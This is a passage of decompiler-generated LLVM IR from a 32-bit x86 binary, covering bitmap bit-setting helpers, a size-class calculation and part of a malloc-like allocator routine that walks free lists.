  %tmp3 = icmp slt i32 %arg1, 1
  br i1 %tmp3, label %dec_label_pc_804f744, label %dec_label_pc_804f737

dec_label_pc_804f737:                             ; preds = %dec_label_pc_804f72c
  %v1_804f737 = add i32 %arg1, -64
  %v3_804f737 = sub i32 63, %arg1
  %v4_804f737 = and i32 %v3_804f737, %arg1
  %v5_804f737 = icmp slt i32 %v4_804f737, 0
  %v6_804f737 = icmp eq i32 %v1_804f737, 0
  %v7_804f737 = icmp slt i32 %v1_804f737, 0
  %v3_804f73a = icmp eq i1 %v7_804f737, %v5_804f737
  %v4_804f73a = icmp eq i1 %v6_804f737, false
  %v5_804f73a = and i1 %v4_804f73a, %v3_804f73a
  br i1 %v5_804f73a, label %dec_label_pc_804f744, label %dec_label_pc_804f73c

dec_label_pc_804f73c:                             ; preds = %dec_label_pc_804f737
  %v4_804f73f = call i32 @function_804f848(i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_804f744

dec_label_pc_804f744:                             ; preds = %dec_label_pc_804f737, %dec_label_pc_804f72c, %dec_label_pc_804f73c
  %v1_804f744 = call i32 @function_804e1ec(i32 ptrtoint (i32* @0 to i32))
  %v1_804f749 = inttoptr i32 %v1_804f744 to i32*
  store i32 22, i32* %v1_804f749, align 4
  ret i32 -1

; uselistorder directives
  uselistorder i32 %v1_804f737, { 1, 0 }
  uselistorder i32 %arg1, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_804f744, { 2, 0, 1 }
}

define i32 @function_804f758(i32 %arg1) local_unnamed_addr {
dec_label_pc_804f758:
  %v3_804f766 = inttoptr i32 %arg1 to i8*
  %v4_804f766 = call i32 @function_804f1d8(i8* %v3_804f766, i32 0, i32 128)
  ret i32 0
}

define i32 @function_804f848(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_804f848:
  %stack_var_-4 = alloca i32, align 4
  %v0_804f848 = load i32, i32* @ebx, align 4
  store i32 %v0_804f848, i32* %stack_var_-4, align 4
  %v1_804f856 = add i32 %arg2, -1
  %v1_804f859 = urem i32 %v1_804f856, 32
  %v2_804f859 = icmp eq i32 %v1_804f859, 0
  store i32 %v1_804f859, i32* @ecx, align 4
  %v2_804f85c = udiv i32 %v1_804f856, 32
  store i32 %v2_804f85c, i32* @edx, align 4
  br i1 %v2_804f859, label %bb5, label %bb

bb:                                               ; preds = %dec_label_pc_804f848
  %v5_804f85f = shl i32 1, %v1_804f859
  br label %bb5

bb5:                                              ; preds = %dec_label_pc_804f848, %bb
  %v6_804f861 = phi i32 [ 1, %dec_label_pc_804f848 ], [ %v5_804f85f, %bb ]
  %v2_804f861 = mul nuw nsw i32 %v2_804f85c, 4
  %v3_804f861 = add i32 %v2_804f861, %arg1
  %v4_804f861 = inttoptr i32 %v3_804f861 to i32*
  %v5_804f861 = load i32, i32* %v4_804f861, align 4
  %v7_804f861 = or i32 %v5_804f861, %v6_804f861
  store i32 %v7_804f861, i32* %v4_804f861, align 4
  %v2_804f866 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804f866, i32* @ebx, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v2_804f85c, { 1, 0 }
  uselistorder i32 %v1_804f859, { 2, 1, 0 }
  uselistorder label %bb5, { 1, 0 }
}

define i32 @function_804f868(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_804f868:
  %v1_804f876 = add i32 %arg2, -1
  %v1_804f879 = urem i32 %v1_804f876, 32
  %v2_804f879 = icmp eq i32 %v1_804f879, 0
  %v2_804f87c = udiv i32 %v1_804f876, 32
  br i1 %v2_804f879, label %bb5, label %bb

bb:                                               ; preds = %dec_label_pc_804f868
  %v4_804f87f = shl i32 -2, %v1_804f879
  %v5_804f87f = sub nsw i32 32, %v1_804f879
  %v6_804f87f = lshr i32 -2, %v5_804f87f
  %v7_804f87f = or i32 %v6_804f87f, %v4_804f87f
  br label %bb5

bb5:                                              ; preds = %dec_label_pc_804f868, %bb
  %v6_804f881 = phi i32 [ -2, %dec_label_pc_804f868 ], [ %v7_804f87f, %bb ]
  %v2_804f881 = mul nuw nsw i32 %v2_804f87c, 4
  %v3_804f881 = add i32 %v2_804f881, %arg1
  %v4_804f881 = inttoptr i32 %v3_804f881 to i32*
  %v5_804f881 = load i32, i32* %v4_804f881, align 4
  %v7_804f881 = and i32 %v5_804f881, %v6_804f881
  store i32 %v7_804f881, i32* %v4_804f881, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_804f879, { 1, 2, 0 }
  uselistorder label %bb5, { 1, 0 }
}

define i32 @function_804f888() local_unnamed_addr {
dec_label_pc_804f888:
  %v0_804f888 = load i32, i32* @eax, align 4
  %v6_804f89b = icmp ugt i32 %v0_804f888, 16777215
  br i1 %v6_804f89b, label %dec_label_pc_804f8ac, label %dec_label_pc_804f89d

dec_label_pc_804f89d:                             ; preds = %dec_label_pc_804f888
  %v2_804f88b = udiv i32 %v0_804f888, 256
  %tmp = icmp ult i32 %v0_804f888, 256
  %v2_804f89d = call i32 @llvm.ctlz.i32(i32 %v2_804f88b, i1 true)
  %v3_804f89d = xor i32 %v2_804f89d, 31
  %v5_804f89d = select i1 %tmp, i32 95, i32 %v3_804f89d
  %v1_804f8a0 = add nuw nsw i32 %v5_804f89d, 6
  %v2_804f8a3 = urem i32 %v1_804f8a0, 32
  %v4_804f8a3 = icmp eq i32 %v2_804f8a3, 0
  br i1 %v4_804f8a3, label %bb4, label %bb

bb:                                               ; preds = %dec_label_pc_804f89d
  %v5_804f8a3 = lshr i32 %v0_804f888, %v2_804f8a3
  br label %bb4

bb4:                                              ; preds = %dec_label_pc_804f89d, %bb
  %v0_804f8a5 = phi i32 [ %v0_804f888, %dec_label_pc_804f89d ], [ %v5_804f8a3, %bb ]
  %v1_804f8a5 = urem i32 %v0_804f8a5, 4
  %v2_804f8a8 = mul nuw nsw i32 %v5_804f89d, 4
  %v3_804f8a8 = or i32 %v1_804f8a5, 32
  %v4_804f8a8 = add nuw nsw i32 %v3_804f8a8, %v2_804f8a8
  br label %dec_label_pc_804f8ac

dec_label_pc_804f8ac:                             ; preds = %dec_label_pc_804f888, %bb4
  %v0_804f8ad = phi i32 [ 95, %dec_label_pc_804f888 ], [ %v4_804f8a8, %bb4 ]
  ret i32 %v0_804f8ad

; uselistorder directives
  uselistorder i32 %v2_804f8a3, { 1, 0 }
  uselistorder i32 %v0_804f888, { 2, 3, 0, 1, 4 }
  uselistorder i1 true, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_804f8ac, { 1, 0 }
  uselistorder label %bb4, { 1, 0 }
}

define i32 @function_804f8ae(i32 %arg1) local_unnamed_addr {
dec_label_pc_804f8ae:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-92 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_804f8ae = load i32, i32* @ebp, align 4
  %v0_804f8af = load i32, i32* @edi, align 4
  %v0_804f8b0 = load i32, i32* @esi, align 4
  %v0_804f8b1 = load i32, i32* @ebx, align 4
  store i32 %v0_804f8b1, i32* %stack_var_-16, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v2_804f8c3 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_804f8c3, i32* @eax, align 4
  store i32 %v2_804f8c3, i32* %stack_var_-92, align 4
  %v2_804f8c8 = call i32 @function_8050de2(i32 %v2_804f8c3, i32 134548959)
  store i32 %v2_804f8c8, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_80552f0.54 to i32), i32* %stack_var_-92, align 4
  %v1_804f8d4 = call i32 @function_8050ddf(i32 ptrtoint (i32* @global_var_80552f0.54 to i32))
  store i32 %v1_804f8d4, i32* %eax.global-to-local, align 4
  %v0_804f8dc = load i32, i32* %ebx.global-to-local, align 4
  %tmp123 = icmp ult i32 %v0_804f8dc, -32
  br i1 %tmp123, label %dec_label_pc_804f8f3, label %dec_label_pc_804f8e1

dec_label_pc_804f8e1:                             ; preds = %dec_label_pc_804f8ae
  %v0_804f8e1 = load i32, i32* %stack_var_-92, align 4
  %v1_804f8e1 = call i32 @function_804e1ec(i32 %v0_804f8e1)
  store i32 %v1_804f8e1, i32* %eax.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v1_804f8e8 = inttoptr i32 %v1_804f8e1 to i32*
  store i32 12, i32* %v1_804f8e8, align 4
  br label %dec_label_pc_8050018

dec_label_pc_804f8f3:                             ; preds = %dec_label_pc_804f8ae
  %v1_804f8f3 = add i32 %v0_804f8dc, 11
  %tmp124 = icmp ult i32 %v1_804f8f3, 16
  %v1_804f903 = and i32 %v1_804f8f3, -8
  %v1_804f8f3.v1_804f903 = select i1 %tmp124, i32 %v1_804f8f3, i32 %v1_804f903
  %.v1_804f903 = select i1 %tmp124, i32 16, i32 %v1_804f903
  store i32 %v1_804f8f3.v1_804f903, i32* %eax.global-to-local, align 4
  %v0_804f90a = load i8, i8* @global_var_805b540.55, align 1
  %v1_804f90a = sext i8 %v0_804f90a to i32
  store i32 %v1_804f90a, i32* @ebx, align 4
  %v3_804f910 = urem i8 %v0_804f90a, 2
  %v4_804f910 = icmp eq i8 %v3_804f910, 0
  %v1_804f913 = icmp eq i1 %v4_804f910, false
  br i1 %v1_804f913, label %dec_label_pc_804f932, label %dec_label_pc_804f915

dec_label_pc_804f915:                             ; preds = %dec_label_pc_804f8f3
  %v2_804f915 = icmp eq i8 %v0_804f90a, 0
  %v1_804f917 = icmp eq i1 %v2_804f915, false
  br i1 %v1_804f917, label %dec_label_pc_804fc0d, label %dec_label_pc_804f91d

dec_label_pc_804f91d:                             ; preds = %dec_label_pc_804f915
  store i32 ptrtoint (i8* @global_var_805b540.55 to i32), i32* %stack_var_-92, align 4
  %v2_804f925 = call i32 @function_80500b1(i32* bitcast (i8* @global_var_805b540.55 to i32*))
  store i32 %v2_804f925, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804fc0d

dec_label_pc_804f932:                             ; preds = %dec_label_pc_804f8f3
  %v11_804f932 = trunc i32 %.v1_804f903 to i8
  %v8_804f936 = icmp ugt i8 %v11_804f932, %v0_804f90a
  br i1 %v8_804f936, label %dec_label_pc_804f953, label %dec_label_pc_804f938

dec_label_pc_804f938:                             ; preds = %dec_label_pc_804f932
  %v2_804f93c = udiv i32 %.v1_804f903, 2
  store i32 %v2_804f93c, i32* %eax.global-to-local, align 4
  %v1_804f93e = add i32 %v2_804f93c, ptrtoint (i8* @global_var_805b540.55 to i32)
  store i32 %v1_804f93e, i32* %ecx.global-to-local, align 4
  %v1_804f944 = add i32 %v2_804f93c, add (i32 ptrtoint (i8* @global_var_805b540.55 to i32), i32 -4)
  %v2_804f944 = inttoptr i32 %v1_804f944 to i32*
  %v3_804f944 = load i32, i32* %v2_804f944, align 4
  store i32 %v3_804f944, i32* %edx.global-to-local, align 4
  %v1_804f947 = icmp eq i32 %v3_804f944, 0
  br i1 %v1_804f947, label %dec_label_pc_804f953, label %dec_label_pc_804f94b

dec_label_pc_804f94b:                             ; preds = %dec_label_pc_804f938
  %v1_804f94b = add i32 %v3_804f944, 8
  %v2_804f94b = inttoptr i32 %v1_804f94b to i32*
  %v3_804f94b = load i32, i32* %v2_804f94b, align 4
  store i32 %v3_804f94b, i32* %eax.global-to-local, align 4
  store i32 %v3_804f94b, i32* %v2_804f944, align 4
  br label %dec_label_pc_804f98c

dec_label_pc_804f953:                             ; preds = %dec_label_pc_804f938, %dec_label_pc_804f932
  %v8_804f953 = icmp ult i32 %.v1_804f903, 255
  %v6_804f95b = icmp ugt i32 %.v1_804f903, 255
  store i32 %.v1_804f903, i32* @eax, align 4
  br i1 %v6_804f95b, label %dec_label_pc_804f994, label %dec_label_pc_804f95d

dec_label_pc_804f95d:                             ; preds = %dec_label_pc_804f953
  %v2_804f961 = udiv i32 %.v1_804f903, 8
  store i32 %v2_804f961, i32* %eax.global-to-local, align 4
  %v1_804f968 = mul nuw i32 %v2_804f961, 8
  %v2_804f968 = add i32 %v1_804f968, ptrtoint (i32* @global_var_805b56c.56 to i32)
  store i32 %v2_804f968, i32* %ecx.global-to-local, align 4
  %v1_804f96f = add i32 %v1_804f968, add (i32 ptrtoint (i32* @global_var_805b56c.56 to i32), i32 12)
  %v2_804f96f = inttoptr i32 %v1_804f96f to i32*
  %v3_804f96f = load i32, i32* %v2_804f96f, align 4
  store i32 %v3_804f96f, i32* %edx.global-to-local, align 4
  %v12_804f972 = icmp eq i32 %v3_804f96f, %v2_804f968
  br i1 %v12_804f972, label %dec_label_pc_804fa90.preheader, label %dec_label_pc_804f97a

dec_label_pc_804f97a:                             ; preds = %dec_label_pc_804f95d
  store i32 %.v1_804f903, i32* %ebx.global-to-local, align 4
  %v1_804f97e = add i32 %v3_804f96f, 12
  %v2_804f97e = inttoptr i32 %v1_804f97e to i32*
  %v3_804f97e = load i32, i32* %v2_804f97e, align 4
  store i32 %v3_804f97e, i32* %eax.global-to-local, align 4
  store i32 %v3_804f97e, i32* %v2_804f96f, align 4
  %v0_804f984 = load i32, i32* %edx.global-to-local, align 4
  %v1_804f984 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804f984 = add i32 %v0_804f984, 4
  %v3_804f984 = add i32 %v2_804f984, %v1_804f984
  %v4_804f984 = inttoptr i32 %v3_804f984 to i32*
  %v5_804f984 = load i32, i32* %v4_804f984, align 4
  %v6_804f984 = or i32 %v5_804f984, 1
  store i32 %v6_804f984, i32* %v4_804f984, align 4
  %v0_804f989 = load i32, i32* %ecx.global-to-local, align 4
  %v1_804f989 = load i32, i32* %eax.global-to-local, align 4
  %v2_804f989 = add i32 %v1_804f989, 8
  %v3_804f989 = inttoptr i32 %v2_804f989 to i32*
  store i32 %v0_804f989, i32* %v3_804f989, align 4
  br label %dec_label_pc_804f98c

dec_label_pc_804f98c:                             ; preds = %dec_label_pc_804fd29, %dec_label_pc_804fd3b, %dec_label_pc_804f94b, %dec_label_pc_804f97a
  %v0_804f98c = load i32, i32* %edx.global-to-local, align 4
  %v1_804f98c = add i32 %v0_804f98c, 8
  store i32 %v1_804f98c, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8050007

dec_label_pc_804f994:                             ; preds = %dec_label_pc_804f953
  %v0_804f998 = call i32 @function_804f888()
  store i32 %v0_804f998, i32* %eax.global-to-local, align 4
  %v3_804f99d = and i8 %v0_804f90a, 2
  %v4_804f99d = icmp eq i8 %v3_804f99d, 0
  %v6_804f99d = zext i8 %v3_804f99d to i32
  %v9_804f99d = and i32 %v1_804f90a, -256
  %v10_804f99d = or i32 %v9_804f99d, %v6_804f99d
  store i32 %v10_804f99d, i32* @ebx, align 4
  br i1 %v4_804f99d, label %dec_label_pc_804fa90.preheader, label %dec_label_pc_804f9aa

dec_label_pc_804f9aa:                             ; preds = %dec_label_pc_804f994
  store i32 ptrtoint (i8* @global_var_805b540.55 to i32), i32* %stack_var_-92, align 4
  %v2_804f9b2 = call i32 @function_80500b1(i32* bitcast (i8* @global_var_805b540.55 to i32*))
  store i32 %v2_804f9b2, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804fa90.preheader

dec_label_pc_804fa90.preheader:                   ; preds = %dec_label_pc_804f9aa, %dec_label_pc_804f95d, %dec_label_pc_804f994
  %stack_var_-40.0.ph = phi i32 [ %v2_804f961, %dec_label_pc_804f95d ], [ %v0_804f998, %dec_label_pc_804f9aa ], [ %v0_804f998, %dec_label_pc_804f994 ]
  %v0_804fa909 = load i32, i32* @global_var_805b580.59, align 128
  store i32 %v0_804fa909, i32* @ebp, align 4
  %v9_804fa9615 = icmp eq i32 %v0_804fa909, 134591860
  %v1_804fa9c17 = icmp eq i1 %v9_804fa9615, false
  br i1 %v1_804fa9c17, label %dec_label_pc_804f9bf.lr.ph, label %dec_label_pc_804faa2

dec_label_pc_804f9bf.lr.ph:                       ; preds = %dec_label_pc_804fa90.preheader
  %v1_804f9e6 = add i32 %.v1_804f903, 16
  br label %dec_label_pc_804f9bf

dec_label_pc_804f9bf:                             ; preds = %dec_label_pc_804f9bf.lr.ph, %dec_label_pc_804fa90
  %v1_804ffb9 = phi i32 [ %v0_804fa909, %dec_label_pc_804f9bf.lr.ph ], [ %v0_804fa90, %dec_label_pc_804fa90 ]
  %v1_804f9bf = add i32 %v1_804ffb9, 4
  %v2_804f9bf = inttoptr i32 %v1_804f9bf to i32*
  %v3_804f9bf = load i32, i32* %v2_804f9bf, align 4
  %v1_804f9c2 = add i32 %v1_804ffb9, 12
  %v2_804f9c2 = inttoptr i32 %v1_804f9c2 to i32*
  %v3_804f9c2 = load i32, i32* %v2_804f9c2, align 4
  store i32 %v3_804f9c2, i32* %edx.global-to-local, align 4
  %v1_804f9c5 = and i32 %v3_804f9bf, -4
  store i32 %v1_804f9c5, i32* @edi, align 4
  %v9_804f9d2 = icmp eq i32 %v3_804f9c2, 134591860
  %v1_804f9d8 = icmp eq i1 %v9_804f9d2, false
  %or.cond95 = or i1 %v6_804f95b, %v1_804f9d8
  br i1 %or.cond95, label %dec_label_pc_804f9f1, label %dec_label_pc_804f9da

dec_label_pc_804f9da:                             ; preds = %dec_label_pc_804f9bf
  %v1_804f9da = load i32, i32* @global_var_805b570.57, align 16
  %v12_804f9da = icmp eq i32 %v1_804ffb9, %v1_804f9da
  %v1_804f9e0 = icmp eq i1 %v12_804f9da, false
  br i1 %v1_804f9e0, label %dec_label_pc_804f9f1, label %dec_label_pc_804f9e2

dec_label_pc_804f9e2:                             ; preds = %dec_label_pc_804f9da
  store i32 %v1_804f9e6, i32* %eax.global-to-local, align 4
  %v6_804f9eb = icmp ugt i32 %v1_804f9c5, %v1_804f9e6
  br i1 %v6_804f9eb, label %dec_label_pc_804ffa2, label %dec_label_pc_804f9f1

dec_label_pc_804f9f1:                             ; preds = %dec_label_pc_804f9e2, %dec_label_pc_804f9da, %dec_label_pc_804f9bf
  store i32 ptrtoint (i32* @global_var_805b574.58 to i32), i32* %eax.global-to-local, align 4
  %v2_804f9f6 = add i32 %v3_804f9c2, 8
  %v3_804f9f6 = inttoptr i32 %v2_804f9f6 to i32*
  store i32 ptrtoint (i32* @global_var_805b574.58 to i32), i32* %v3_804f9f6, align 4
  %v0_804f9f9 = load i32, i32* %edx.global-to-local, align 4
  store i32 %v0_804f9f9, i32* @global_var_805b580.59, align 4
  %v0_804f9fc = load i32, i32* @edi, align 4
  %v15_804f9fc = icmp eq i32 %v0_804f9fc, %.v1_804f903
  br i1 %v15_804f9fc, label %dec_label_pc_804ffe3, label %dec_label_pc_804fa06

dec_label_pc_804fa06:                             ; preds = %dec_label_pc_804f9f1
  %v6_804fa0c = icmp ugt i32 %v0_804f9fc, 255
  br i1 %v6_804fa0c, label %dec_label_pc_804fa1f, label %dec_label_pc_804fa0e

dec_label_pc_804fa0e:                             ; preds = %dec_label_pc_804fa06
  %v2_804fa10 = udiv i32 %v0_804f9fc, 8
  store i32 %v2_804fa10, i32* %esi.global-to-local, align 4
  %v1_804fa13 = mul nuw i32 %v2_804fa10, 8
  %v2_804fa13 = add i32 %v1_804fa13, 134591852
  store i32 %v2_804fa13, i32* @ebx, align 4
  %v1_804fa1a = add i32 %v1_804fa13, 134591860
  %v2_804fa1a = inttoptr i32 %v1_804fa1a to i32*
  %v3_804fa1a = load i32, i32* %v2_804fa1a, align 4
  store i32 %v3_804fa1a, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804fa68

dec_label_pc_804fa1f:                             ; preds = %dec_label_pc_804fa06
  store i32 %v0_804f9fc, i32* @eax, align 4
  %v0_804fa21 = call i32 @function_804f888()
  store i32 %v0_804fa21, i32* %esi.global-to-local, align 4
  %v1_804fa28 = mul i32 %v0_804fa21, 8
  %v2_804fa28 = add i32 %v1_804fa28, ptrtoint (i32* @global_var_805b56c.56 to i32)
  store i32 %v2_804fa28, i32* %eax.global-to-local, align 4
  %v1_804fa2f = add i32 %v1_804fa28, add (i32 ptrtoint (i32* @global_var_805b56c.56 to i32), i32 8)
  %v2_804fa2f = inttoptr i32 %v1_804fa2f to i32*
  %v3_804fa2f = load i32, i32* %v2_804fa2f, align 4
  store i32 %v3_804fa2f, i32* %edx.global-to-local, align 4
  store i32 %v3_804fa2f, i32* @ebx, align 4
  %v12_804fa38 = icmp eq i32 %v3_804fa2f, %v2_804fa28
  br i1 %v12_804fa38, label %dec_label_pc_804fa68, label %dec_label_pc_804fa3c

dec_label_pc_804fa3c:                             ; preds = %dec_label_pc_804fa1f
  %v1_804fa3c = add i32 %v1_804fa28, add (i32 ptrtoint (i32* @global_var_805b56c.56 to i32), i32 12)
  %v2_804fa3c = inttoptr i32 %v1_804fa3c to i32*
  %v3_804fa3c = load i32, i32* %v2_804fa3c, align 4
  store i32 %v3_804fa3c, i32* @ebx, align 4
  %v0_804fa3f = load i32, i32* @edi, align 4
  %v2_804fa3f = add i32 %v3_804fa3c, 4
  %v3_804fa3f = inttoptr i32 %v2_804fa3f to i32*
  %v4_804fa3f = load i32, i32* %v3_804fa3f, align 4
  %v10_804fa3f = icmp ult i32 %v0_804fa3f, %v4_804fa3f
  %v1_804fa42 = icmp eq i1 %v10_804fa3f, false
  br i1 %v1_804fa42, label %dec_label_pc_804fa4a, label %dec_label_pc_804fa68

dec_label_pc_804fa4a:                             ; preds = %dec_label_pc_804fa3c
  %v1_804fa4c = or i32 %v0_804fa3f, 1
  store i32 %v1_804fa4c, i32* %eax.global-to-local, align 4
  store i32 %v3_804fa2f, i32* %ebx.global-to-local, align 4
  %v2_804fa60109 = add i32 %v3_804fa2f, 4
  %v3_804fa60110 = inttoptr i32 %v2_804fa60109 to i32*
  %v4_804fa60111 = load i32, i32* %v3_804fa60110, align 4
  %v10_804fa60112 = icmp ult i32 %v1_804fa4c, %v4_804fa60111
  br i1 %v10_804fa60112, label %dec_label_pc_804fa51, label %dec_label_pc_804fa65

dec_label_pc_804fa51:                             ; preds = %dec_label_pc_804fa4a, %dec_label_pc_804fa51
  %v0_804fa65113 = phi i32 [ %v3_804fa55, %dec_label_pc_804fa51 ], [ %v3_804fa2f, %dec_label_pc_804fa4a ]
  store i32 %v0_804fa65113, i32* %ecx.global-to-local, align 4
  %v1_804fa55 = add i32 %v0_804fa65113, 8
  %v2_804fa55 = inttoptr i32 %v1_804fa55 to i32*
  %v3_804fa55 = load i32, i32* %v2_804fa55, align 4
  store i32 %v3_804fa55, i32* %ecx.global-to-local, align 4
  store i32 %v3_804fa55, i32* %ebx.global-to-local, align 4
  %v2_804fa60 = add i32 %v3_804fa55, 4
  %v3_804fa60 = inttoptr i32 %v2_804fa60 to i32*
  %v4_804fa60 = load i32, i32* %v3_804fa60, align 4
  %v10_804fa60 = icmp ult i32 %v1_804fa4c, %v4_804fa60
  br i1 %v10_804fa60, label %dec_label_pc_804fa51, label %dec_label_pc_804fa65

dec_label_pc_804fa65:                             ; preds = %dec_label_pc_804fa51, %dec_label_pc_804fa4a
  %v0_804fa65.lcssa = phi i32 [ %v3_804fa2f, %dec_label_pc_804fa4a ], [ %v3_804fa55, %dec_label_pc_804fa51 ]
  %v1_804fa65 = add i32 %v0_804fa65.lcssa, 12
  %v2_804fa65 = inttoptr i32 %v1_804fa65 to i32*
  %v3_804fa65 = load i32, i32* %v2_804fa65, align 4
  store i32 %v3_804fa65, i32* @ebx, align 4
  br label %dec_label_pc_804fa68

dec_label_pc_804fa68:                             ; preds = %dec_label_pc_804fa0e, %dec_label_pc_804fa3c, %dec_label_pc_804fa1f, %dec_label_pc_804fa65
  %v0_804fa68 = phi i32 [ %v0_804fa21, %dec_label_pc_804fa1f ], [ %v0_804fa21, %dec_label_pc_804fa65 ], [ %v0_804fa21, %dec_label_pc_804fa3c ], [ %v2_804fa10, %dec_label_pc_804fa0e ]
  %stack_var_-64.1 = phi i32 [ %v2_804fa28, %dec_label_pc_804fa1f ], [ %v0_804fa65.lcssa, %dec_label_pc_804fa65 ], [ %v2_804fa28, %dec_label_pc_804fa3c ], [ %v3_804fa1a, %dec_label_pc_804fa0e ]
  %v1_804fa6a = urem i32 %v0_804fa68, 32
  %v2_804fa6a = icmp eq i32 %v1_804fa6a, 0
  store i32 %v1_804fa6a, i32* %esi.global-to-local, align 4
  store i32 %v1_804fa6a, i32* %ecx.global-to-local, align 4
  store i32 1, i32* %eax.global-to-local, align 4
  %v2_804fa74 = sdiv i32 %v0_804fa68, 32
  store i32 %v2_804fa74, i32* %edx.global-to-local, align 4
  br i1 %v2_804fa6a, label %dec_label_pc_804fa90, label %bb

bb:                                               ; preds = %dec_label_pc_804fa68
  %v5_804fa77 = shl i32 1, %v1_804fa6a
  store i32 %v5_804fa77, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804fa90

dec_label_pc_804fa90:                             ; preds = %dec_label_pc_804fa68, %bb
  %v5_804fa79 = phi i32 [ 1, %dec_label_pc_804fa68 ], [ %v5_804fa77, %bb ]
  %v1_804fa79 = mul nsw i32 %v2_804fa74, 4
  %v2_804fa79 = add i32 %v1_804fa79, ptrtoint (i32* @global_var_805b874.60 to i32)
  %v3_804fa79 = inttoptr i32 %v2_804fa79 to i32*
  %v4_804fa79 = load i32, i32* %v3_804fa79, align 4
  %v6_804fa79 = or i32 %v4_804fa79, %v5_804fa79
  store i32 %v6_804fa79, i32* %v3_804fa79, align 4
  %v0_804fa80 = load i32, i32* @ebx, align 4
  %v1_804fa80 = load i32, i32* @ebp, align 4
  %v2_804fa80 = add i32 %v1_804fa80, 12
  %v3_804fa80 = inttoptr i32 %v2_804fa80 to i32*
  store i32 %v0_804fa80, i32* %v3_804fa80, align 4
  store i32 %stack_var_-64.1, i32* @esi, align 4
  %v1_804fa87 = load i32, i32* @ebp, align 4
  %v2_804fa87 = add i32 %v1_804fa87, 8
  %v3_804fa87 = inttoptr i32 %v2_804fa87 to i32*
  store i32 %stack_var_-64.1, i32* %v3_804fa87, align 4
  %v0_804fa8a = load i32, i32* @ebp, align 4
  %v1_804fa8a = load i32, i32* @ebx, align 4
  %v2_804fa8a = add i32 %v1_804fa8a, 8
  %v3_804fa8a = inttoptr i32 %v2_804fa8a to i32*
  store i32 %v0_804fa8a, i32* %v3_804fa8a, align 4
  %v0_804fa8d = load i32, i32* @ebp, align 4
  %v1_804fa8d = load i32, i32* @esi, align 4
  %v2_804fa8d = add i32 %v1_804fa8d, 12
  %v3_804fa8d = inttoptr i32 %v2_804fa8d to i32*
  store i32 %v0_804fa8d, i32* %v3_804fa8d, align 4
  %v0_804fa90 = load i32, i32* @global_var_805b580.59, align 128
  store i32 %v0_804fa90, i32* @ebp, align 4
  %v9_804fa96 = icmp eq i32 %v0_804fa90, 134591860
  %v1_804fa9c = icmp eq i1 %v9_804fa96, false
  br i1 %v1_804fa9c, label %dec_label_pc_804f9bf, label %dec_label_pc_804faa2

dec_label_pc_804faa2:                             ; preds = %dec_label_pc_804fa90, %dec_label_pc_804fa90.preheader
  br i1 %v8_804f953, label %dec_label_pc_804fb30, label %dec_label_pc_804fab0

dec_label_pc_804fab0:                             ; preds = %dec_label_pc_804faa2
  store i32 %stack_var_-40.0.ph, i32* %eax.global-to-local, align 4
  %v1_804fab4 = mul i32 %stack_var_-40.0.ph, 8
  %v2_804fab4 = add i32 %v1_804fab4, ptrtoint (i32* @global_var_805b56c.56 to i32)
  store i32 %v2_804fab4, i32* %edx.global-to-local, align 4
  %v1_804fabb = add i32 %v1_804fab4, add (i32 ptrtoint (i32* @global_var_805b56c.56 to i32), i32 12)
  %v2_804fabb = inttoptr i32 %v1_804fabb to i32*
  %storemerge1.pre = load i32, i32* %v2_804fabb, align 4
  br label %dec_label_pc_804fb2c

dec_label_pc_804fac0:                             ; preds = %dec_label_pc_804fb2c
  %v1_804fac0 = add i32 %v4_804fad7, 4
  %v2_804fac0 = inttoptr i32 %v1_804fac0 to i32*
  %v3_804fac0 = load i32, i32* %v2_804fac0, align 4
  store i32 %v3_804fac0, i32* %ebx.global-to-local, align 4
  %v1_804fac3 = add i32 %v4_804fad7, 12
  %v2_804fac3 = inttoptr i32 %v1_804fac3 to i32*
  %v3_804fac3 = load i32, i32* %v2_804fac3, align 4
  store i32 %v3_804fac3, i32* @ecx, align 4
  %v1_804fac6 = and i32 %v3_804fac0, -4
  store i32 %v1_804fac6, i32* @ebx, align 4
  %v10_804fac9 = icmp ult i32 %v1_804fac6, %.v1_804f903
  br i1 %v10_804fac9, label %dec_label_pc_804fb2c, label %dec_label_pc_804facf

dec_label_pc_804facf:                             ; preds = %dec_label_pc_804fac0
  %v1_804facf = add i32 %v4_804fad7, 8
  %v2_804facf = inttoptr i32 %v1_804facf to i32*
  %v3_804facf = load i32, i32* %v2_804facf, align 4
  store i32 %v3_804facf, i32* @edx, align 4
  %v1_804fad2 = add i32 %v3_804facf, 12
  %v2_804fad2 = inttoptr i32 %v1_804fad2 to i32*
  %v3_804fad2 = load i32, i32* %v2_804fad2, align 4
  %v15_804fad2 = icmp eq i32 %v3_804fad2, %v4_804fad7
  %v1_804fad5 = icmp eq i1 %v15_804fad2, false
  br i1 %v1_804fad5, label %dec_label_pc_804fadc, label %dec_label_pc_804fad7

dec_label_pc_804fad7:                             ; preds = %dec_label_pc_804facf
  %v1_804fad7 = add i32 %v3_804fac3, 8
  %v2_804fad7 = inttoptr i32 %v1_804fad7 to i32*
  %v3_804fad7 = load i32, i32* %v2_804fad7, align 4
